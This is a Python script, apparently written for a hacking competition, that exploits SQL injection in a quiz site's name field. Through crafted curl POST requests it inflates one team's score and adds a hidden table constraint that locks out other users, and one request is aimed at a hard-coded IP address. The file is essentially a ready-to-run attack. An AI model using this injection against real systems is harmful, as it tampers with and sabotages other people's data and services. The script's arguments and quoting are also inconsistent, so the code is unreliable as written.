
###
#  First Argument: URL
#  Second Argument: Team Name
#  How it works: First, it submits a quiz under our name with the near-max amount of 9's possible (the
#  number of 9's is limited by the number of characters that the curl command can take) by abusing an
#  injection in the name field. Then, using a the same injection, append our own custom command to the
#  end of the existing one. This command seeks out our team name and appends the near-max amount of
#  9's to the score that already exists. This second command is repeated indefinitely.
###

import subprocess
from string import ascii_lowercase
from string import ascii_uppercase
import random
import sys
letters=ascii_lowercase+ascii_uppercase


ip = sys.argv[1]
score = sys.argv[2]
name = sys.argv[3]
name = "LOUIE LOVER #" + str(random.randint(0, 99999999))
command="curl -X POST --data user=" + name + "','i love louie!');update+scores+set+score%3d%3dscore+||+'" + score + "'+where+user%3d%3d'" + name + "'%3b--#&q1=1337&q2=4&q3=3&q4=1 " + ip + ";"
commands = command.split(" ")
subprocess.run(commands, capture_output=True)

command="curl -X POST --data user=LOUIE_LOVER_#22, '100');alter table scores add constraint NothingToSeeHere Check (user%3d%3dLOUIE_LOVER_#22)%3b--#&q1=1337&q2=4&q3=3&q4=1;" '163.118.82.7:8887'
commands = command.split(" ")
subprocess.run(commands, capture_output=True)